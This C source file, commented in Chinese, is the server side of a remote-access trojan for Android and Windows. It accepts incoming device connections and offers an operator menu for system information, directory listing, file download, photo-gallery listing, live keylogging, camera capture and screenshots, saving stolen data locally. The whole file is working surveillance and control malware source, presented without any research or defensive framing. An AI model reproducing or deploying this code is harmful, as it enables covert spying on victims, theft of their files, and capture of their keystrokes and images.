/*
 * socket_server.c  —  多客户端控制端（Android + Windows）
 * 编译: gcc socket_server.c -o server.exe -lws2_32
 *
 * 端口:
 *   PORT_ANDROID (8080) — 等待 Android 客户端
 *   PORT_WINDOWS (8081) — 等待 Windows 客户端（socket_client 的 Windows 版）
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "include/common.h"

#pragma comment(lib, "ws2_32.lib")

#define PORT_ANDROID  8080
#define PORT_WINDOWS  8081
#define MAX_CLIENTS   8

/* ── 客户端类型 ───────────────────────────────────────── */
typedef enum { CLIENT_UNKNOWN = 0, CLIENT_ANDROID, CLIENT_WINDOWS } ClientType;

typedef struct {
    SOCKET      sock;
    ClientType  type;
    char        ip[INET_ADDRSTRLEN];
    int         id;
    int         active;
} Client;

static Client   g_clients[MAX_CLIENTS] = {0};
static int      g_client_count = 0;
static CRITICAL_SECTION g_cs;

/* ── 工具 ─────────────────────────────────────────────── */
static int send_cmd(SOCKET sock, const char *cmd, char *resp, int resp_size) {
    if (send(sock, cmd, (int)strlen(cmd), 0) <= 0) return -1;
    memset(resp, 0, resp_size);
    int total = 0, n;
    do {
        n = recv(sock, resp + total, resp_size - total - 1, 0);
        if (n <= 0) break;
        total += n;
        resp[total] = '\0';
        if (strstr(resp, "\nEND\n")) break;
        if (strncmp(resp, RESP_DATA, 5) == 0 && total > 20) break;
    } while (total < resp_size - 1);
    return total;
}

static int recv_binary(SOCKET sock, const char *header, const char *save_path) {
    long data_len = 0;
    sscanf(header + 5, "%ld", &data_len);
    if (data_len <= 0 || data_len > 20 * 1024 * 1024) return -1;
    char *buf = (char *)malloc(data_len);
    if (!buf) return -1;
    long received = 0;
    while (received < data_len) {
        int n = recv(sock, buf + received, (int)(data_len - received), 0);
        if (n <= 0) break;
        received += n;
    }
    FILE *f = fopen(save_path, "wb");
    if (f) { fwrite(buf, 1, received, f); fclose(f); }
    free(buf);
    return (int)received;
}

static Client *find_client(int id) {
    for (int i = 0; i < MAX_CLIENTS; i++)
        if (g_clients[i].active && g_clients[i].id == id)
            return &g_clients[i];
    return NULL;
}

static void list_clients() {
    printf("\n===== 已连接客户端 =====\n");
    int found = 0;
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (g_clients[i].active) {
            printf("  [%d] %s  (%s)\n", g_clients[i].id, g_clients[i].ip,
                   g_clients[i].type == CLIENT_ANDROID ? "Android" : "Windows");
            found++;
        }
    }
    if (!found) printf("  (无)\n");
    printf("========================\n");
}

/* ── 命令函数 ─────────────────────────────────────────── */
static void cmd_sysinfo(Client *c) {
    char buf[BUFFER_SIZE];
    printf("\n[*] [%d] 获取系统信息...\n", c->id);
    send_cmd(c->sock, CMD_SYSINFO, buf, sizeof(buf));
    printf("%s\n", buf);
}

static void cmd_listdir(Client *c, const char *path) {
    char cmd[MAX_PATH_LEN + 20], buf[BUFFER_SIZE];
    snprintf(cmd, sizeof(cmd), "%s%s", CMD_LISTDIR, path);
    printf("\n[*] [%d] 列出目录: %s\n", c->id, path);
    send_cmd(c->sock, cmd, buf, sizeof(buf));
    printf("%s\n", buf);
}

static void cmd_gallery(Client *c) {
    char buf[BUFFER_SIZE];
    printf("\n[*] [%d] 获取图库列表...\n", c->id);
    send_cmd(c->sock, CMD_GALLERY, buf, sizeof(buf));
    printf("%s\n", buf);
}

static void cmd_getfile(Client *c, const char *path) {
    char cmd[MAX_PATH_LEN + 20], buf[BUFFER_SIZE];
    snprintf(cmd, sizeof(cmd), "%s%s", CMD_GETFILE, path);
    printf("\n[*] [%d] 获取文件: %s\n", c->id, path);
    int n = send_cmd(c->sock, cmd, buf, sizeof(buf));
    if (n > 0 && strncmp(buf, RESP_DATA, 5) == 0) {
        const char *fname = strrchr(path, '/');
        if (!fname) fname = strrchr(path, '\\');
        fname = fname ? fname + 1 : path;
        char save[256];
        snprintf(save, sizeof(save), "recv_%d_%s", c->id, fname);
        int bytes = recv_binary(c->sock, buf, save);
        printf("[OK] 已保存: %s (%d bytes)\n", save, bytes);
    } else {
        printf("%s\n", buf);
    }
}

static void cmd_camera(Client *c) {
    char buf[BUFFER_SIZE];
    printf("\n[*] [%d] 拍照中...\n", c->id);
    int n = send_cmd(c->sock, CMD_CAMERA_CAPTURE, buf, sizeof(buf));
    if (n > 0 && strncmp(buf, RESP_DATA, 5) == 0) {
        char save[64];
        snprintf(save, sizeof(save), "capture_%d.jpg", c->id);
        int bytes = recv_binary(c->sock, buf, save);
        printf("[OK] 已保存: %s (%d bytes)\n", save, bytes);
    } else {
        printf("%s\n", buf);
    }
}

static void cmd_keylog(Client *c, int start) {
    char buf[BUFFER_SIZE];
    const char *cmd = start ? CMD_KEYLOG_START : CMD_KEYLOG_STOP;
    printf("\n[*] [%d] 键盘监听: %s\n", c->id, start ? "开始" : "停止");
    send(c->sock, cmd, (int)strlen(cmd), 0);
    if (start) {
        printf("[*] 监听中，输入 q 回车停止...\n");
        // 非阻塞接收，同时检测用户输入 q
        u_long mode = 1;
        ioctlsocket(c->sock, FIONBIO, &mode);
        while (1) {
            memset(buf, 0, sizeof(buf));
            int n = recv(c->sock, buf, sizeof(buf) - 1, 0);
            if (n > 0) {
                buf[n] = '\0';
                if (strncmp(buf, RESP_KEYEVENT, 9) == 0)
                    printf("[KEY] %s\n", buf + 9);
            }
            // 检查用户是否按 q
            if (_kbhit()) {
                char ch = (char)_getch();
                if (ch == 'q' || ch == 'Q') break;
            }
            Sleep(20);
        }
        mode = 0;
        ioctlsocket(c->sock, FIONBIO, &mode);
        send(c->sock, CMD_KEYLOG_STOP, (int)strlen(CMD_KEYLOG_STOP), 0);
        printf("[*] 键盘监听已停止\n");
    }
}

static void disconnect_client(Client *c) {
    send(c->sock, CMD_EXIT, (int)strlen(CMD_EXIT), 0);
    closesocket(c->sock);
    printf("[*] 客户端 [%d] %s 已断开\n", c->id, c->ip);
    EnterCriticalSection(&g_cs);
    c->active = 0;
    g_client_count--;
    LeaveCriticalSection(&g_cs);
}

/* ── 菜单 ─────────────────────────────────────────────── */
static void show_menu(Client *c) {
    printf("\n===== 控制 [%d] %s (%s) =====\n",
           c->id, c->ip,
           c->type == CLIENT_ANDROID ? "Android" : "Windows");
    printf("1. 系统信息\n");
    printf("2. 列出目录\n");
    printf("3. 获取文件\n");
    printf("4. 图库列表\n");
    printf("5. 键盘监听\n");
    if (c->type == CLIENT_ANDROID)
        printf("6. 拍照\n");
    else
        printf("6. 截屏\n");
    printf("0. 断开此客户端\n");
    printf("b. 返回主菜单\n");
    printf("选择: ");
}

static void control_client(Client *c) {
    char input[MAX_PATH_LEN];
    while (c->active) {
        show_menu(c);
        if (!fgets(input, sizeof(input), stdin)) break;
        input[strcspn(input, "\r\n")] = 0;

        if (strcmp(input, "b") == 0) break;
        if (strcmp(input, "0") == 0) { disconnect_client(c); break; }

        int choice = atoi(input);
        char path[MAX_PATH_LEN];

        switch (choice) {
        case 1: cmd_sysinfo(c); break;
        case 2:
            printf("路径 (如 /sdcard 或 C:\\): ");
            fgets(path, sizeof(path), stdin);
            path[strcspn(path, "\r\n")] = 0;
            cmd_listdir(c, path);
            break;
        case 3:
            printf("文件路径: ");
            fgets(path, sizeof(path), stdin);
            path[strcspn(path, "\r\n")] = 0;
            cmd_getfile(c, path);
            break;
        case 4: cmd_gallery(c); break;
        case 5: cmd_keylog(c, 1); break;
        case 6:
            if (c->type == CLIENT_ANDROID) cmd_camera(c);
            else {
                // 截屏：复用 getfile 的接收逻辑
                char buf[BUFFER_SIZE];
                printf("\n[*] [%d] 截屏中...\n", c->id);
                int n = send_cmd(c->sock, CMD_SCREENSHOT, buf, sizeof(buf));
                if (n > 0 && strncmp(buf, RESP_DATA, 5) == 0) {
                    char save[64];
                    snprintf(save, sizeof(save), "screen_%d.bmp", c->id);
                    int bytes = recv_binary(c->sock, buf, save);
                    printf("[OK] 已保存: %s (%d bytes)\n", save, bytes);
                } else {
                    printf("%s\n", buf);
                }
            }
            break;
        default: printf("[!] 无效选项\n");
        }
    }
}

/* ── 监听线程（每个端口一个）─────────────────────────── */
typedef struct { int port; ClientType type; } ListenArgs;

static DWORD WINAPI listen_thread(LPVOID param) {
    ListenArgs *args = (ListenArgs *)param;
    int port         = args->port;
    ClientType type  = args->type;
    free(args);

    SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons((u_short)port);

    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("[ERR] 端口 %d bind 失败\n", port);
        return 1;
    }
    listen(srv, 5);
    printf("[*] 监听 %s 端口 %d...\n",
           type == CLIENT_ANDROID ? "Android" : "Windows", port);

    while (1) {
        struct sockaddr_in cli_addr;
        int cli_len = sizeof(cli_addr);
        SOCKET cli = accept(srv, (struct sockaddr *)&cli_addr, &cli_len);
        if (cli == INVALID_SOCKET) break;

        EnterCriticalSection(&g_cs);
        if (g_client_count >= MAX_CLIENTS) {
            LeaveCriticalSection(&g_cs);
            printf("[!] 客户端已满，拒绝连接\n");
            closesocket(cli);
            continue;
        }
        // 找空槽
        int slot = -1;
        static int next_id = 1;
        for (int i = 0; i < MAX_CLIENTS; i++) {
            if (!g_clients[i].active) { slot = i; break; }
        }
        g_clients[slot].sock   = cli;
        g_clients[slot].type   = type;
        g_clients[slot].active = 1;
        g_clients[slot].id     = next_id++;
        inet_ntop(AF_INET, &cli_addr.sin_addr,
                  g_clients[slot].ip, INET_ADDRSTRLEN);
        g_client_count++;
        LeaveCriticalSection(&g_cs);

        printf("\n>>> 新设备上线 [%d] %s (%s)，输入 l 查看列表\n",
               g_clients[slot].id, g_clients[slot].ip,
               type == CLIENT_ANDROID ? "Android" : "Windows");
        printf("> ");
        fflush(stdout);
    }
    closesocket(srv);
    return 0;
}

/* ── 主菜单 ───────────────────────────────────────────── */
static void main_menu() {
    char input[64];

    printf("\n正在监听中，等待设备上线...\n");
    printf("输入 l 查看已上线设备，输入 q 退出\n\n");

    while (1) {
        printf("> ");
        fflush(stdout);

        if (!fgets(input, sizeof(input), stdin)) break;
        input[strcspn(input, "\r\n")] = 0;

        if (strcmp(input, "q") == 0) break;

        // l 或直接回车 — 列出所有客户端
        if (strcmp(input, "l") == 0 || strcmp(input, "") == 0) {
            printf("\n===== 已上线设备 =====\n");
            int found = 0;
            EnterCriticalSection(&g_cs);
            for (int i = 0; i < MAX_CLIENTS; i++) {
                if (g_clients[i].active) {
                    printf("  [%d] %-16s  %s\n",
                           g_clients[i].id,
                           g_clients[i].ip,
                           g_clients[i].type == CLIENT_ANDROID ? "Android" : "Windows");
                    found++;
                }
            }
            LeaveCriticalSection(&g_cs);
            if (!found) printf("  (暂无设备上线)\n");
            printf("======================\n");
            printf("输入设备编号连接，输入 l 刷新列表，输入 q 退出\n");
            continue;
        }

        // 数字 — 连接对应设备
        int id = atoi(input);
        if (id > 0) {
            Client *c = find_client(id);
            if (!c) {
                printf("[!] 未找到设备 %d，请输入 l 查看当前列表\n", id);
                continue;
            }
            printf("\n[+] 已连接设备 [%d] %s (%s)\n",
                   c->id, c->ip,
                   c->type == CLIENT_ANDROID ? "Android" : "Windows");
            printf("    输入 b 可退出此设备，返回设备列表\n");
            control_client(c);
            printf("\n[*] 已退出设备 [%d]，返回主菜单\n", id);
            printf("输入 l 查看设备列表\n");
        } else {
            printf("[!] 无效输入，输入 l 查看设备列表\n");
        }
    }
}

/* ── main ─────────────────────────────────────────────── */
int main() {
    SetConsoleOutputCP(65001);
    SetConsoleCP(65001);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    InitializeCriticalSection(&g_cs);

    // 启动两个监听线程
    ListenArgs *a1 = malloc(sizeof(ListenArgs));
    a1->port = PORT_ANDROID; a1->type = CLIENT_ANDROID;
    CreateThread(NULL, 0, listen_thread, a1, 0, NULL);

    ListenArgs *a2 = malloc(sizeof(ListenArgs));
    a2->port = PORT_WINDOWS; a2->type = CLIENT_WINDOWS;
    CreateThread(NULL, 0, listen_thread, a2, 0, NULL);

    printf("服务端已启动\n");
    printf("Android 设备连接端口: %d\n", PORT_ANDROID);
    printf("Windows 设备连接端口: %d\n", PORT_WINDOWS);
    printf("----------------------------------\n");
    printf("操作说明:\n");
    printf("  l       查看已上线设备列表\n");
    printf("  <数字>  连接对应设备\n");
    printf("  q       退出程序\n");
    printf("----------------------------------\n");

    main_menu();

    // 断开所有客户端
    for (int i = 0; i < MAX_CLIENTS; i++)
        if (g_clients[i].active) disconnect_client(&g_clients[i]);

    DeleteCriticalSection(&g_cs);
    WSACleanup();
    return 0;
}
